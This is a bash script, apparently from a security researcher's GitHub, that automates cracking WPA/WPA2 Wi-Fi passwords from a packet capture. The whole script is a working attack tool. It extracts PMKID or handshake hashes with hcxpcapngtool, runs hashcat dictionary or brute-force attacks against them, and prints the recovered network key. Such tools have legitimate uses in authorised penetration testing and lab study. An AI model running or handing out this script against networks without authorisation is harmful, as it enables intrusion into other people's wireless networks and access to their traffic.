#!/bin/bash

# ============================================================
#  IoT_WIFI_PSK_Autocrack.sh - WPA/WPA2 PSK Auto Cracker (PMKID + Handshake)
#  TheMalwareGuardian | github.com/TheMalwareGuardian
# ============================================================

PCAP="$1"
WORDLIST="$2"

OUTDIR="wifi_crack_output"
HASHFILE="$OUTDIR/wifi.hash"
CRACKED="$OUTDIR/cracked.txt"
LOGFILE="$OUTDIR/hashcat.log"



# Colors

BOLD=$'\033[1m'
RESET=$'\033[0m'
C_CYAN=$'\033[1;36m'
C_YELLOW=$'\033[1;33m'
C_GREEN=$'\033[1;32m'
C_RED=$'\033[1;31m'
C_MAGENTA=$'\033[1;35m'
C_WHITE=$'\033[1;37m'
C_DARK=$'\033[2;37m'

section() {
	echo ""
	echo -e "${C_RED}${BOLD}╔══════════════════════════════════════════════════════╗${RESET}"
	printf "${C_RED}${BOLD}║${RESET}  ${C_WHITE}${BOLD}%-52s${RESET}${C_RED}${BOLD}║${RESET}\n" "$1"
	echo -e "${C_RED}${BOLD}╚══════════════════════════════════════════════════════╝${RESET}"
	echo ""
}



# Banner

echo ""
echo -e "${C_RED}${BOLD}"
echo "  ██╗    ██╗██╗███████╗██╗"
echo "  ██║    ██║██║██╔════╝██║"
echo "  ██║ █╗ ██║██║█████╗  ██║"
echo "  ██║███╗██║██║██╔══╝  ██║"
echo "  ╚███╔███╔╝██║██║     ██║"
echo "   ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝"
echo -e "${RESET}"
echo -e "  ${C_DARK}WiFi PSK Auto Cracker • TheMalwareGuardian${RESET}"
echo ""
echo -e "  ${C_WHITE}${BOLD}Capture:${RESET} ${C_YELLOW}${BOLD}$PCAP${RESET}"
echo ""



# Checks

if [ -z "$PCAP" ]; then
	echo -e "${C_RED}Usage:${RESET} $0 <capture.pcap> [wordlist]"
	exit 1
fi

if [ ! -f "$PCAP" ]; then
	echo -e "${C_RED}[ERROR] File not found${RESET}"
	exit 1
fi

if ! command -v hcxpcapngtool &>/dev/null; then
	echo -e "${C_RED}[ERROR] hcxpcapngtool not installed${RESET}"
	exit 1
fi

if ! command -v hashcat &>/dev/null; then
	echo -e "${C_RED}[ERROR] hashcat not installed${RESET}"
	exit 1
fi

mkdir -p "$OUTDIR"
rm -f "$HASHFILE" "$CRACKED" "$LOGFILE"



# 1. FILE IDENTIFICATION

section "1. FILE IDENTIFICATION"

file "$PCAP" | sed 's/^/  /'



# 2. PCAP → HASH

section "2. PCAP → HASH (hcxpcapngtool)"

hcxpcapngtool -o "$HASHFILE" "$PCAP" > "$OUTDIR/hcx_output.txt" 2>/dev/null

if [ ! -s "$HASHFILE" ]; then
	echo -e "  ${C_RED}[!] Failed to generate hash${RESET}"
	exit 1
fi

echo -e "  ${C_GREEN}[+] Hash file:${RESET} $HASHFILE"

PMKID=$(grep -c "WPA\*01" "$HASHFILE")
HANDSHAKE=$(grep -c "WPA\*02" "$HASHFILE")

echo ""
[ "$PMKID" -gt 0 ] && echo -e "  ${C_CYAN}[+] PMKID detected${RESET}"
[ "$HANDSHAKE" -gt 0 ] && echo -e "  ${C_CYAN}[+] 4-way handshake detected${RESET}"



# 3. PASSWORD CRACKING

section "3. PASSWORD CRACKING"

if [ -n "$WORDLIST" ] && [ -f "$WORDLIST" ]; then

	echo -e "  ${C_YELLOW}[MODE] Dictionary attack${RESET}"
	echo -e "  ${C_YELLOW}Wordlist:${RESET} $WORDLIST"

	hashcat -m 22000 -a 0 "$HASHFILE" "$WORDLIST" -o "$CRACKED" | tee "$LOGFILE"

else

	echo -e "  ${C_YELLOW}[MODE] Brute-force fallback${RESET}"
	echo -e "  ${C_DARK}No wordlist provided → using mask attack${RESET}"

	hashcat -m 22000 -a 3 "$HASHFILE" '?a?a?a?a?a?a?a?a' -o "$CRACKED" | tee "$LOGFILE"

fi



# 4. RESULT

section "4. RESULT"

# If nothing cracked, try recovering from potfile
if [ ! -s "$CRACKED" ]; then
	hashcat -m 22000 --show "$HASHFILE" > "$CRACKED" 2>/dev/null
	echo -e "  ${C_DARK}[i] Checking potfile...${RESET}"
fi

if [ ! -s "$CRACKED" ]; then
	echo -e "  ${C_RED}[!] Password not recovered${RESET}"
	exit 1
fi

PASSWORD=$(awk -F: '{print $NF}' "$CRACKED" | head -n1)

echo -e "  ${C_GREEN}[+] PSK:${RESET} ${BOLD}$PASSWORD${RESET}"



# DONE

echo ""
echo -e "${C_MAGENTA}${BOLD}╔══════════════════════════════════════════════════════╗${RESET}"
printf "${C_MAGENTA}${BOLD}║${RESET}  ${C_GREEN}${BOLD}%-52s${RESET}${C_MAGENTA}${BOLD}║${RESET}\n" "WiFi Crack Complete."
echo -e "${C_MAGENTA}${BOLD}╚══════════════════════════════════════════════════════╝${RESET}"
echo ""
